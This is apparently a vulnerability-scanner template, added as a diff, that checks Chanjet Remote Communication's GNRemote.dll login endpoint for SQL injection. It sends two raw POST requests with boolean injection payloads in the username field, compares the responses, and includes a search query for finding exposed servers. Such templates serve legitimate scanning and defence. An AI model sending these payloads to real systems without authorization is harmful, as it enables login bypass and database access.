@@ -1,0 +1,44 @@
+id: chanjet-gnremote-sqli
+
+info:
+  name: Changjietong Remote Communication GNRemote.dll - SQL Injection
+  author: xc
+  severity: high
+  description: |
+    Chanjetong has a SQL injection vulnerability, which can be used by attackers to obtain sensitive information in the database.
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: body="远程通CHANJET_Remote"
+  tags: yonyou,chanjet,sqli
+
+http:
+  - raw:
+      - |
+        POST /GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+        username=%22'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
+      - |
+        POST /GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+        username=%22'%20or%201%3d2%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_1
+        words:
+          - "{\"RetCode\":0}"
+
+      - type: word
+        part: body_2
+        words:
+          - "{\"RetCode\":2}"
+
+# digest: 490a00463044022059409423f5601e69825c00301e9ca83b199ae9c096845f086a078ea4bfe41cd202207eeb445f38bc99afe1460593a4485d69e447595e78738b6a6e39640d54f9200c:922c64590222798bb761d5b6d8e72950
